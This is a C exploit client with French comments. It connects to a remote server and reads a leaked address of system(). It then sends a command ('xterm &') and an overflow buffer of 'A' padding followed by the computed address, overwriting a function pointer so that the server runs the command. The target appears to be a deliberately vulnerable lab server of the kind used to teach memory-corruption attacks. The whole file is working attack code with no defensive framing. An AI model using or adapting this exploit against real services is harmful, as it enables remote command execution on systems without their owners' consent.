
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netdb.h> 

#define BUFSIZE 12 /* the estimated diff between funcptr/buf */

#define CMD "xterm &" /* command to execute if successful */

#define ERROR -1

int main(int argc, char **argv)
{	
	register int i;
	u_long sysaddr;
	static char buf[BUFSIZE + sizeof(u_long) + 1] = {0};
	
	
	/* variables pour la socket */
	int sockfd, portno, n;
	struct sockaddr_in serv_addr;
	struct hostent *server;
	char buffer[100];
	
	if (argc < 4) {
		fprintf(stderr,"Usage: %s <hostname> <port> <offset>\n", argv[0]);
		exit(-1);
	}
	portno = atoi(argv[2]);
	sockfd = socket(AF_INET, SOCK_STREAM, 0);
	if (sockfd < 0) {
		perror("ERROR opening socket");
		exit(-1);
	}
	server = gethostbyname(argv[1]);
	if (server == NULL) {
		fprintf(stderr,"ERROR, no such host\n");
		exit(-1);
	}
	bzero((char *) &serv_addr, sizeof(serv_addr));
	serv_addr.sin_family = AF_INET;
	bcopy((char *)server->h_addr, (char *)&serv_addr.sin_addr.s_addr, server->h_length);
	serv_addr.sin_port = htons(portno);
	if (connect(sockfd,&serv_addr,sizeof(serv_addr)) < 0) {
		printf("ERROR connecting");
		perror("ERROR connecting");
		exit(-1);
	}
	/* fin d'initialisation de la socket */
	
	/*******************************************************/
	/* lecture de l'adresse de "system()"
	 */
	bzero(buffer,sizeof(buffer));
	n = read(sockfd,buffer,sizeof(buffer));
	if (n < 0) {
		perror("ERROR reading from socket");
		exit(-1);
	}
	
	sysaddr = (u_long)atoi(buffer) - atoi(argv[3]);
	printf("client(exploit) :: system(): 0x%lx\n",(u_long)atoi(buffer));
	printf("client(exploit) :: trying system() at 0x%lx\n", sysaddr);
	
	
	/*******************************************************/
	/* on envoie l'argument de a fonction:
	 */
	n = write(sockfd,CMD,sizeof(CMD));
	if (n < 0) {
		perror("ERROR writing to socket");
		exit(-1);
	}
	
	/*******************************************************/
	/* juste pour flusher.. */
	bzero(buffer,sizeof(buffer));
	n = read(sockfd,buffer,sizeof(buffer));
	if (n < 0) {
		perror("ERROR reading from socket");
		exit(-1);
	}
	printf("client(exploit) :: flush= %s\n", buffer);
	
	/*******************************************************/
	/* on envoie la chaine à inserer dans le buffer distant
	 */
	
	//bzero(buf,sizeof(buf));
	memset(buf, 'A', BUFSIZE);
	
	/* reverse byte order (on a little endian system) (ntohl equiv) */
	for (i = 0; i < sizeof(sysaddr); i++)
		buf[BUFSIZE + i] = ((u_long)sysaddr >> (i * 8)) & 255;
	
	printf("client(exploit) :: send buffer= %s\n", buf);
	n = write(sockfd,buf,sizeof(buf));
	if (n < 0) {
		perror("ERROR writing to socket");
		exit(-1);
	}
	/*
	while(1){
	
	}
	*/
	return 0;
}
